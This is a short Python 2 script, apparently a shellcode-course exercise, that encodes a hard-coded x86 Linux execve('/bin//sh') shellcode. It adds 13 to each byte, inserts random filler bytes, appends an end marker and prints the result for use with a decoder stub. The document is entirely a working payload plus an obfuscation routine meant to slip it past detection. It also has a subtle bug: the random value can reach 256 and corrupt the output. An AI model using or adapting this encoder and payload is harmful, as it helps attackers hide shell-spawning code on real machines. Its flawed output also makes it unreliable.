# Custom Encoder
# insertion + rot-13
import random

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded1 = ""
encoded2 = ""

for b in bytearray(shellcode):

	encoded1 += '\\x'
	encoded1 += '%02x' % ((b+13)%256)

#	rand = 0xfa
#	while rand == 0xfa:
#		rand = random.randint(1,256)
	bad_vals = [0xfa]
    	while True:
		rand = random.randint(1,256)
        	if rand not in bad_vals:
	        	break
	
	encoded1 += '\\x%02x' % rand

	encoded2 += '0x'
	encoded2 += '%02x,' % ((b+13)%256)
	encoded2 += '0x%02x,' % rand

encoded1 += '\\xbb\\xbb'
encoded2 += '0xbb,0xbb'


print(encoded1)
print(encoded2)

print('Length: %d' % len(bytearray(shellcode)))
